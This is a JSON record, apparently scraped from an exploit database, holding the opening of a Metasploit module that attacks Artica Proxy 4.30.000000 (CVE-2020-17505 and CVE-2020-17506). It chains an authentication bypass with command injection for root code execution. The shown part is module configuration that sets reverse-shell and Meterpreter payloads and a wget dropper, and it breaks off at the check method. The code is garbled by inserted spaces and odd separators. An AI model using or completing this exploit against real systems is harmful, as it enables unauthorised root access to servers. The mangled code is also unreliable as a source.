{
    "text": "vul_name : Artica Proxy 4.30.000000 Authentication Bypass / Command Injection ， vul_cve : CVE-2020-17505 , CVE-2020-17506 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， super (  ， update_info (  ， info ,  ， 'Name' => 'Artica proxy 4.30.000000 Auth Bypass service-cmds-peform Command Injection' ,  ， 'Description' => %q{ ， This module exploits an authenticated command injection vulnerability in Artica Proxy , combined with an authentication bypass ， discovered on the same version , it is possible to trigger the vulnerability without knowing the credentials. ， The application runs in virtual appliance , successful exploitation of this vulnerability yields remote code execution as root on the ， remote system. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Max0x4141' ,  # discovery ， 'Redouane NIBOUCHA <rniboucha [ at ] yahoo.fr>' # msf module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2020-17505' ]  ,  # RCE ，  [ 'CVE' , '2020-17506' ]  ,  # Auth bypass ，  [ 'EDB' , '48744' ]  ,  ，  [ 'PACKETSTORM' , '158868' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'DefaultOptions' => ， { ， 'SSL' => true ,  ， 'RPort' => 9000 ， } ,  ， 'Platform' => %w [ unix linux ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_command ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_perl' ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : linux_dropper ,  ， 'DefaultOptions' => { ， 'CMDSTAGER : FLAVOR' => 'wget' ,  ， 'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp' ， } ，  ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'DisclosureDate' => '2020-08-09' ,  ， 'DefaultTarget' => 1 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ IOC_IN_LOGS ]  ， } ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The URI of the vulnerable Artica Proxy' , '/' ]  )  ,  ， OptString.new ( 'PHPSESSID' ,  [ false , 'The cookie obtained after successful authentication , if present' ]  )  ，  ]  ， import_target_defaults ， end ， def check ，  @ phpsessid = datastore [ 'PHPSESSID' ]  ， check_result = auth_bypass",
    "time": "2020.09.24"
}